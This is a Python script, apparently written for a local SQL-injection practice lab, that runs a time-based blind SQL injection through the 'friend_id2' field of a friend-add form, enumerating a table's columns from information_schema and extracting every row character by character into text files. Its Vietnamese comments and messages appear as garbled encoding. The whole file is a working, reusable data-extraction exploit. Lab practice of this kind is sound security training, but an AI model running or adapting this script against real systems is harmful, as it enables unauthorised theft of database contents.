import requests
import string
import time
import sys

url = "http://localhost/sql-injection-lab/1/friendadd.php"
cookies = {"PHPSESSID": "47jhemumu2hib038cmlrnp3gml"}
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "http://localhost/sql-injection-lab/1/friendadd.php"
}
char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_" + "{}!@#$%^&*()_+-=[]|;:,.<>?/'\""
TIME_THRESHOLD = 20
def brute_force_sql(query_template, description):
    extracted_value = ""
    index = 1
    while True:
        found = False
        for char in char_set:
            payload = f"1' AND IF(SUBSTRING(({query_template}),{index},1)='{char}', SLEEP(20), 0) -- "
            data = {"friend_id": "21", "friend_id2": payload, "add_submit": "Addfriend"}
            start_time = time.time()
            response = requests.post(url, data=data, headers=headers, cookies=cookies)
            elapsed_time = time.time() - start_time
            if elapsed_time > TIME_THRESHOLD:
                extracted_value += char
                sys.stdout.write(f"\r[+] Extracting {description}: {extracted_value}")
                sys.stdout.flush()
                found = True
                break
        if not found:
            break
        index += 1
    print()
    return extracted_value
# 1Ô∏è‚É£ Nh·∫≠p t√™n b·∫£ng c·∫ßn brute-force
table_name = input("Nh·∫≠p t√™n b·∫£ng c·∫ßn brute-force c·ªôt v√† d·ªØ li·ªáu: ")
# 2Ô∏è‚É£ Brute-force t√™n c√°c c·ªôt trong b·∫£ng
column_names = []
column_index = 0
while True:
    column_name = brute_force_sql(
        f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 1 OFFSET {column_index}",
        f"Column Name {column_index + 1}"
    )
    if column_name == "":
        break
    column_names.append(column_name)
    column_index += 1
# L∆∞u danh s√°ch c·ªôt v√†o file
with open(f"{table_name}_columns.txt", "w") as f:
    for col in column_names:
        f.write(col + "\n")
print("\nüìã List of Columns:")
for i, col in enumerate(column_names, 1):
    print(f"  {i}. {col}")
print(f"\n‚úÖ Danh s√°ch c·ªôt ƒë√£ ƒë∆∞·ª£c l∆∞u v√†o file '{table_name}_columns.txt'")
# 3Ô∏è‚É£ Brute-force d·ªØ li·ªáu trong t·ª´ng c·ªôt
for column in column_names:
    print(f"\nüîç Extracting data from column: {column}")
    extracted_data = []
    row_index = 0
    while True:
        row_value = brute_force_sql(
            f"SELECT {column} FROM {table_name} LIMIT 1 OFFSET {row_index}",
            f"{column} - Row {row_index + 1}"
        )
        if row_value == "":
            break
        extracted_data.append(row_value)
        row_index += 1
    # L∆∞u d·ªØ li·ªáu v√†o file
    with open(f"{table_name}_{column}.txt", "w") as f:
        for row in extracted_data:
            f.write(row + "\n")
    print(f"‚úÖ D·ªØ li·ªáu t·ª´ c·ªôt '{column}' ƒë√£ ƒë∆∞·ª£c l∆∞u v√†o '{table_name}_{column}.txt'")
